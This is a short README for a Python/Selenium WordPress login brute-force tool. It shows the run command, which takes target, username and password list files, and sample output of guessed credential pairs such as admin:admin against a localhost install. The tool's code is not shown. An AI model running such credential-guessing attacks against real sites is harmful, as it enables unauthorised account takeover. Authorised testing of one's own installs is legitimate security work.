# WordPress Brute Force

## How To Use: ##
```
C:\Users\Recep\Desktop>python brute-force.py site.txt user.txt password.txt

==================================================================================
,   . ;-.    ,-.          .         ,--.
| . | |  )   |  )         |         |
| | | |-'    |-<  ;-. . . |-  ,-.   |-   ,-. ;-. ,-. ,-.
|/|/  |      |  ) |   | | |   |-'   |    | | |   |   |-'
' '   '      `-'  '   `-` `-' `-'   '    `-' '   `-' `-'
==================================================================================
How To Use:
        python brute-force.py [target_file] [username_list] [password_list]
==================================================================================
[+] http://localhost/wordpress/ > admin:admin => Login Successful!
[-] http://localhost/wordpress/ > admin:123456 => Login Unsuccessful!
[-] http://localhost/wordpress/ > admin:toor => Login Unsuccessful!
[-] http://localhost/wordpress/ > root:admin => Login Unsuccessful!
[-] http://localhost/wordpress/ > root:123456 => Login Unsuccessful!
[-] http://localhost/wordpress/ > root:toor => Login Unsuccessful!
[-] http://localhost/wordpress/ > administator:admin => Login Unsuccessful!
[-] http://localhost/wordpress/ > administator:123456 => Login Unsuccessful!
[-] http://localhost/wordpress/ > administator:toor => Login Unsuccessful!
==================================================================================
Elapsed Time (Sec): 268.9075803756714
==================================================================================
```

## Requirement: ##
- Selenium And Geckodriver
- Firefox Browser
- Python3

